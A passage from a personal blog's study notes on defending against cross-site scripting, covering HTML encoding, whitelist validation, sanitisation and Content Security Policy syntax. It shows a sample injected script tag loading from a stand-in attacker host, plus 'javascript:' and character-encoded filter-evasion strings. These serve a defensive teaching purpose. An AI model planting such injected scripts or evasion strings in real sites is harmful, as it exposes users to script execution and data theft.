“&gt;” characters with “<code class="language-plaintext highlighter-rouge">&amp;lt;</code>” and “<code class="language-plaintext highlighter-rouge">&amp;gt;</code>” using server scripts</ul><p><img data-proofer-ignore data-src="https://i.imgur.com/ToXYR3i.png" alt="Screen Shot 2020-09-21 at 12.37.13" /></p><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="k">print</span> <span class="s">"&lt;html&gt;"</span>
<span class="k">print</span> <span class="s">"Last comment: "</span>
<span class="k">print</span> <span class="nf">encodeHtml</span><span class="p">(</span><span class="n">userInput</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"&lt;/html&gt;"</span>


<span class="n">user</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="p">...</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>

<span class="c1"># after encoding
</span><span class="k">print</span> <span class="s">"&lt;html&gt;"</span>
<span class="k">print</span> <span class="s">"Last comment: "</span>
<span class="k">print</span> <span class="nf">encodeHtml</span><span class="p">(</span><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="p">...</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"&lt;/html&gt;"</span>

<span class="c1"># user result
# no xss execute
</span><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
<span class="n">Last</span> <span class="n">comment</span><span class="p">:</span>
<span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">script</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;...</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">/</span><span class="n">script</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>
<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
</pre></table></code></div></div><p><strong>Encoding on the client-side</strong> encoding user input on the client-side using JavaScript, several built-in methods and properties that automatically encode all data in a context-aware manner:</p><div class="table-wrapper"><table><thead><tr><th>Context<th>Method/property<tbody><tr><td>HTML element content<td><code class="language-plaintext highlighter-rouge">node.textContent = userInput</code><tr><td>HTML attribute value<td><code class="language-plaintext highlighter-rouge">element.setAttribute(attribute, userInput)</code><tr><td>.<td><code class="language-plaintext highlighter-rouge">element[attribute] = userInput</code><tr><td>URL query value<td><code class="language-plaintext highlighter-rouge">window.encodeURIComponent(userInput)</code><tr><td>CSS value<td><code class="language-plaintext highlighter-rouge">element.style.property = userInput</code></table></div><p>JavaScript provides no built-in way of encoding data to be included in JavaScript source code.</p><p><strong>Limitations of encoding</strong> when user input is used to provide URLs, such as in the example below:</p><p><code class="language-plaintext highlighter-rouge">document.querySelector('a').href = userInput</code></p><ol><li>Although assigning a value to the <code class="language-plaintext highlighter-rouge">href</code> property of an anchor element automatically encodes it so that it becomes nothing more than an attribute value<li>this in itself <code class="language-plaintext highlighter-rouge">does not prevent the attacker from inserting a URL beginning with "javascript:"</code><ul><li>When the link is clicked, whatever JavaScript is embedded inside the URL will be executed.</ul><li><code class="language-plaintext highlighter-rouge">Encoding is an inadequate solution when you actually want the user to define part of a page's code</code><ul><li>An example is a user profile page where the user can define custom HTML.<li>If this custom HTML were encoded, the profile page could consist only of plain text.</ul><li>Encoding should be your first line of defense against XSS, because its very purpose is to neutralize data so that it cannot be interpreted as code.<li>In some cases, encoding needs to be complemented with validation,</ol><hr /><h3 id="validation">Validation</h3><ul><li>filtering user input<li>all malicious parts of it are removed, without necessarily removing all code in it.<li>One of the most recognizable types of validation in web development is<ul><li>allowing some HTML elements (such as <code class="language-plaintext highlighter-rouge">&lt;em&gt; and &lt;strong&gt;</code>)<li>disallowing others (such as <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>)</ul><li>two main characteristics of validation that differ between implementations:<ul><li><strong>Classification strategy</strong>: User input can be classified using either <code class="language-plaintext highlighter-rouge">blacklisting</code> or <code class="language-plaintext highlighter-rouge">whitelisting</code>.<li><strong>Validation outcome</strong>: User input identified as malicious can either be <code class="language-plaintext highlighter-rouge">rejected</code> or <code class="language-plaintext highlighter-rouge">sanitised</code>.</ul></ul><p>Classification strategy</p><ul><li><strong>Blacklisting</strong><ul><li>defining a <code class="language-plaintext highlighter-rouge">forbidden pattern that should not appear in user input</code>.<ul><li>If a string matches this pattern, it is then marked as invalid.<li>example:<li>allow users to submit custom URLs with any protocol except <code class="language-plaintext highlighter-rouge">javascript:</code>.</ul><li>2 major drawbacks:<ul><li><strong>Complexity</strong><ul><li>Accurately have set of all possible malicious strings is a complex task.<li>The example policy described above could not be successfully implemented by simply searching for the substring <code class="language-plaintext highlighter-rouge">"javascript"</code>,<li>because this would miss strings of the form <code class="language-plaintext highlighter-rouge">"Javascript:"</code> (first letter is capitalized) and <code class="language-plaintext highlighter-rouge">"&amp;#106;avascript:"</code> (first letter is encoded as a numeric character reference).</ul><li><strong>Staleness</strong><ul><li>Even if a perfect blacklist were developed, it would fail if a new feature allowing malicious use were added to the browser.<li>For example<li>an HTML validation blacklist developed before the introduction of the HTML5 onmousewheel attribute, would fail to stop an attacker from using that attribute to perform an XSS attack.<li>This drawback is especially significant in web development, which is made up of many different technologies that are constantly being updated.<li>Because of these drawbacks, blacklisting as a classification strategy is strongly discouraged.</ul></ul></ul><li><strong>Whitelisting</strong> <code class="language-plaintext highlighter-rouge">safer approach</code><ul><li>instead of defining a forbidden pattern, defines an allowed pattern<li>marks input as invalid if it does not match this pattern.<ul><li>Example<li>allow users to submit custom URLs containing only the protocols <code class="language-plaintext highlighter-rouge">http:</code> and <code class="language-plaintext highlighter-rouge">https:</code>, nothing else.<li>This approach would automatically mark a URL as invalid if it had the protocol <code class="language-plaintext highlighter-rouge">javascript:</code>,<li>even “<code class="language-plaintext highlighter-rouge">Javascript:</code>” or “<code class="language-plaintext highlighter-rouge">&amp;#106;avascript:</code>”.</ul><li>2 major benefits of whitelisting:<ul><li><strong>Simplicity</strong><ul><li><code class="language-plaintext highlighter-rouge">Accurately describing a set of safe strings</code> is generally much easier than identifying the set of all malicious strings.<li>especially true when user input only needs to include very limited subset of the functionality available in a browser.<li>For example,<li>the whitelist described above allowing only URLs with the protocols <code class="language-plaintext highlighter-rouge">http:</code> or <code class="language-plaintext highlighter-rouge">https:</code> is very simple, and perfectly adequate for users in most situations.</ul><li><strong>Longevity</strong><ul><li>generally not become obsolete when a new feature is added to the browser.<li>For example<li>an HTML validation whitelist allowing only the title attribute on HTML elements<li>remain safe after the introduction of HTML5 onmousewheel attribute.</ul></ul></ul></ul><p><strong>Validation outcome</strong></p><ul><li><strong>Rejection</strong><ul><li>The input is simply rejected, preventing it from being used elsewhere in the website.</ul><li><strong>Sanitisation</strong><ul><li>All invalid parts of the input are removed,<li>the remaining input is used normally by the website.</ul><li>Of these two, <strong>rejection</strong> is the simplest approach to implement.<ul><li>to implement sanitisation, you must make sure that the sanitisation routine itself doesn’t use a blacklisting approach.<li>For example,<li>the URL “<code class="language-plaintext highlighter-rouge">Javascript:...</code>”, even when identified as invalid using a whitelist approach, would get past a sanitisation routine that simply removes all instances of “<code class="language-plaintext highlighter-rouge">javascript:</code>”.<li>For this reason, well-tested libraries and frameworks should be used for sanitisation whenever possible.</ul></ul><hr /><h3 id="content-security-policy-csp">Content Security Policy (CSP)</h3><ul><li>using only secure input handling is that even a single lapse of security<li>Web standard CSP can mitigate this risk.<li>CSP is used to <code class="language-plaintext highlighter-rouge">constrain the browser viewing your page</code><ul><li>it can only use resources downloaded from trusted sources.<ul><li>A resource is a <code class="language-plaintext highlighter-rouge">script, a stylesheet, an image, or some other type of file</code> referred to by the page.</ul><li>even if<ul><li>an attacker succeeds in <code class="language-plaintext highlighter-rouge">injecting malicious content</code> into your website,<li>the <code class="language-plaintext highlighter-rouge">website failed to securely handle user input</code><ul><li>CSP can prevent it from ever being executed<li>prevented the vulnerability from causing any harm.</ul><li>Even if the attacker had <code class="language-plaintext highlighter-rouge">injected the script code inline</code> rather than linking to an external file<ul><li>a properly defined CSP policy disallowing inline JavaScript would also have prevented the vulnerability from causing any harm.</ul></ul></ul><li>CSP can be used to enforce the following rules:<ul><li><strong>No untrusted sources</strong><ul><li>External resources can only be loaded from a set of clearly defined trusted sources.</ul><li><strong>No inline resources</strong><ul><li>Inline JavaScript and CSS will not be evaluated.</ul><li><strong>No eval</strong><ul><li>The JavaScript <code class="language-plaintext highlighter-rouge">eval function</code> cannot be used.</ul></ul></ul><p>CSP in action</p><ul><li>example,<ul><li>an attacker has succeeded in injecting malicious code into a page:<li>With a properly defined CSP policy<li>the browser <code class="language-plaintext highlighter-rouge">would not load and execute malicious‑script.js </code><li>because <code class="language-plaintext highlighter-rouge">http://attacker/</code> is not in the set of trusted sources.</ul></ul><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
Latest comment:
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://attacker/malicious‑script.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><h4 id="how-to-enable-csp">How to enable CSP</h4><ul><li>By default, browsers do not enforce CSP.<li>To enable CSP on your website, pages must be served with an additional HTTP header: <code class="language-plaintext highlighter-rouge">Content‑Security‑Policy</code>.<ul><li>Any page served with this header will have its security policy respected by the browser loading it, provided that the browser supports CSP.<li>the security policy is sent with every HTTP response,</ul><li>it is possible for a server to set its policy on a page-by-page basis.<ul><li>The same policy can be applied to an entire website by providing the same CSP header in every response.</ul><li>The value of the <code class="language-plaintext highlighter-rouge">Content‑Security‑Policy header</code> is a string defining one or more security policies that will take effect on your website.<ul><li>The example headers in this section use newlines and indentation for clarity;<li>this should not be present in an actual header.</ul></ul><h4 id="syntax-of-csp">Syntax of CSP</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Content‑Security‑Policy:    
directive source‑expression, source‑expression, ...<span class="p">;</span>    
directive ...<span class="p">;</span>    ...
</pre></table></code></div></div><p>The syntax of a CSP header made up of two elements:</p><ul><li><code class="language-plaintext highlighter-rouge">Directives</code>:<ul><li>strings specifying a type of resource, taken from a predefined list.</ul><li><code class="language-plaintext highlighter-rouge">Source expressions</code>:<ul><li>patterns describing one or more servers that resources can be downloaded from.</ul></ul><blockquote><p>For every <code class="language-plaintext highlighter-rouge">directive</code>, the <code class="language-plaintext highlighter-rouge">given source expressions</code> define which sources can be used to download resources of the respective type.</p></blockquote><ul><li>Directives<ul><li>The directives that can be used in a CSP header are as follows:<li>connect‑src<li>font‑src<li>frame‑src<li>img‑src<li>media‑src<li>object‑src<li>script‑src<li>style‑src<li>the special directive default‑src <ul><li>can be used to provide a default value for all directives that have not been included in the header.</ul></ul><li>Source expressions<ul><li>The syntax of a source expression is as follows:<li><code class="language-plaintext highlighter-rouge">protocol://host‑name:port‑number</code><li>The host name can start with <code class="language-plaintext highlighter-rouge">*.</code>,<ul><li>which means that any subdomain of the provided host name will be allowed.</ul><li>Similarly, the port number can be <code class="language-plaintext highlighter-rouge">*</code>,<ul><li>which means that all ports will be allowed.</ul><li>Additionally, the protocol and port number can be omitted.<li><p>a protocol can be given by itself, possible to require that all resources be loaded using HTTPS.</p><li>In addition to the syntax above, a source expression can alternatively be one of four keywords with special meaning (quotes included):<li><code class="language-plaintext highlighter-rouge">none</code><ul><li>Allows no resources.</ul><li><code class="language-plaintext highlighter-rouge">self</code><ul><li>Allows resources from the host that served the page.</ul><li><code class="language-plaintext highlighter-rouge">unsafe‑inline</code><ul><li>Allows resources embedded in the page, such as inline <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> elements, <code class="language-plaintext highlighter-rouge">&lt;style&gt;</code> elements, and <code class="language-plaintext highlighter-rouge">javascript: URLs</code>.</ul><li><code class="language-plaintext highlighter-rouge">unsafe‑eval</code><ul><li>Allows the use of the JavaScript eval function.</ul><li>when CSP is used, inline resources and eval are automatically disallowed by default.<ul><li>Using <code class="language-plaintext highlighter-rouge">unsafe‑inline</code> and <code class="language-plaintext highlighter-rouge">unsafe‑eval</code> is the only way to allow them.</ul></ul></ul><p>An example policy</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c"># the page is subject to the following restrictions:</span>
Content‑Security‑Policy:    

<span class="c"># Scripts can be downloaded only from the host serving the page and from `scripts.example.com.`</span>
script‑src <span class="s1">'self'</span> scripts.example.com<span class="p">;</span>   

<span class="c"># Audio and video files cannot be downloaded from anywhere. </span>
media‑src <span class="s1">'none'</span><span class="p">;</span>    

<span class="c"># Image files can be downloaded from any host.</span>
img‑src <span class="k">*</span><span class="p">;</span>    

<span class="c"># All other resources can be downloaded only from the host serving the page and from any subdomain of example.com</span>
default‑src <span class="s1">'self'</span> http://<span class="k">*</span>.example.com
</pre></table></code></div></div><p>Status of CSP</p><ul><li>As of June 2013, Content Security Policy is a W3C candidate recommendation.<li>It is being implemented by browser vendors, but parts of it are still browser-specific.<li>In particular, the HTTP header to use can differ between browsers.<li>Before using CSP today, consult the documentation of the browsers that you intend to support.</ul><hr /><p>Ref:</p><ul><li><a href="https://www.youtube.com/watch?v=u12HB_WjmQE&amp;ab_channel=DominicBatstone">Stored &amp; Reflected XSS and Testing with OWASP ZAP</a><li><a href="https://www.youtube.com/watch?v=UFlF3F-XOG4&amp;ab_channel=webpwnized">Cross-Site Scripting Explained - Part 2: DOM-Based XSS</a><li><a href="https://excess-xss.com/">Excess XSS</a></ul><p>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/10cyberattack/'>10CyberAttack</a>, <a href='/categories/xss/'>XSS</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cyberattack/" class="post-tag no-text-decoration" >CyberAttack</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >XSS</a> <a href="/tags/cheatsheet/" class="post-tag no-text-decoration" >CheatSheet</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Meow's CyberAttack - Cross Site Scripting - Grace&url=https://ocholuo.github.io//posts/XSS/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Meow's CyberAttack - Cross Site Scripting - Grace&u=https://ocholuo.github.io//posts/XSS/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Meow's CyberAttack - Cross Site Scripting - Grace&url=https://ocholuo.github.io//posts/XSS/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/XSS-Filter-Evasion-Cheat-Sheet/"><div class="card-body"> <span class="timeago small" >Sep 19, 2020<i class="unloaded">2020-09-19T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Meow's CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet</h3><div class="text-muted small"><p> Cross Site Scripting Filter Evasion Cheat Sheet [toc] __∧_∧__ ~~~~~ 　／(*´O｀)／＼ ／|￣∪∪￣|＼／ 　|＿＿ ＿|／ por favor, no lo usar para hacer algo malo just learning note, please don't use it to do ...</p></div></div></a></div><div class="card"> <a href="/posts/XSS-Prevention-Cheat-Sheet/"><div class="card-body"> <span class="timeago small" >Sep 19, 2020<i class="unloaded">2020-09-19T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Meow's CyberAttack - Cross Site Scripting Prevention Cheat Sheet</h3><div class="text-muted small"><p> [toc] Cross Site Scripting Prevention Cheat Sheet Introduction Both reflected and stored XSS can be addressed by performing the appropriate validation and encoding on the server-side. D...</p></div></div></a></div><div class="card"> <a href="/posts/SEED-Labs-CrossSiteScripting-Attack-Lab/"><div class="card-body"> <span class="timeago small" >Aug 20, 2020<i class="unloaded">2020-08-20T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SEED Labs – Cross-Site Scripting Attack Lab</h3><div class="text-muted small"><p> SEED Labs – Cross-Site Scripting Attack Lab [toc] Brief The tasks are based on a web application called ELGG which is open source. The prebuilt vm called seedubuntu is used to host the web...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/XSS-Prevention-Cheat-Sheet/" class="btn btn-outline-primary" prompt="Older"><p>Meow's CyberAttack - Cross Site Scripting Prevention Cheat Sheet</p></a> <a href="/posts/JPMorganChase-SDE-Virtual-Experience/" class="btn btn-outline-primary" prompt="Newer"><p>JPMorganChase SDE Virtual Experience</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
